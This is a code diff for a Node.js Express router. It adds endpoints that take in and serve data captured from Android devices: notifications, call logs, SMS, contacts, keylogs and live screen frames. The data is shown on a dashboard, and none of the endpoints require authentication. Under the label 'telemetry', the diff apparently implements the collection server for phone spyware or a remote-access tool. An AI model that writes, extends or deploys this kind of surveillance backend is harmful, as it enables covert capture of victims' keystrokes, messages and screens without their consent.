@@ -352,4 +352,90 @@ router.get('/realtime/sync', (req, res) => {
     });
 });
 
+// ═══════════════════════════════════════════════════════════════
+// INGEST & DEVICE TELEMETRY / LIVE SCREEN PIPELINE
+// ═══════════════════════════════════════════════════════════════
+
+const activeRecords = {
+    devices: [],
+    notifications: [],
+    calls: [],
+    sms: [],
+    contacts: [],
+    keylogs: [],
+    events: [],
+    battery: { level: 100, voltage: "4.3V", temperature: "32.0°C" },
+    device: { model: "Android Sovereign Endpoint" }
+};
+
+// POST /api/ingest — Accept telemetry records from Android app
+router.post('/ingest', (req, res) => {
+    try {
+        const payload = req.body;
+        if (payload) {
+            const devId = payload.device || payload.deviceId || 'Android_Node';
+            
+            // Track active device in fleet list
+            const existing = activeRecords.devices.find(d => d.deviceId === devId);
+            if (existing) {
+                existing.status = 'ONLINE';
+                existing.lastSeen = Date.now();
+            } else {
+                activeRecords.devices.push({
+                    deviceId: devId,
+                    model: payload.model || devId,
+                    name: devId,
+                    status: 'ONLINE',
+                    lastSeen: Date.now()
+                });
+            }
+
+            if (payload.type === 'NOTIFICATION' || payload.app) {
+                activeRecords.notifications.unshift(payload);
+                if (activeRecords.notifications.length > 200) activeRecords.notifications.pop();
+            } else if (payload.type === 'CALL') {
+                activeRecords.calls.unshift(payload);
+                if (activeRecords.calls.length > 200) activeRecords.calls.pop();
+            } else if (payload.type === 'SMS') {
+                activeRecords.sms.unshift(payload);
+                if (activeRecords.sms.length > 200) activeRecords.sms.pop();
+            } else if (payload.type === 'KEYLOG') {
+                activeRecords.keylogs.unshift(payload);
+                if (activeRecords.keylogs.length > 300) activeRecords.keylogs.pop();
+            } else if (payload.battery) {
+                activeRecords.battery = payload.battery;
+            } else {
+                activeRecords.events.unshift(payload);
+                if (activeRecords.events.length > 200) activeRecords.events.pop();
+            }
+
+            if (typeof global.broadcastNewRecord === 'function') {
+                global.broadcastNewRecord();
+            }
+        }
+        res.json({ status: 'INGESTED', timestamp: Date.now() });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// GET /api/records — Serve current fleet records to web dashboard
+router.get('/records', (req, res) => {
+    res.json(activeRecords);
+});
+
+// GET /api/screen.png — Serve latest live screen frame JPEG/PNG
+router.get('/screen.png', (req, res) => {
+    const frame = typeof global.getLatestScreen === 'function' ? global.getLatestScreen() : null;
+    if (frame) {
+        res.setHeader('Content-Type', 'image/jpeg');
+        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+        return res.end(frame);
+    }
+    // 1x1 transparent GIF fallback if no frame received yet
+    const transparentGif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+    res.setHeader('Content-Type', 'image/gif');
+    res.end(transparentGif);
+});
+
 module.exports = router;
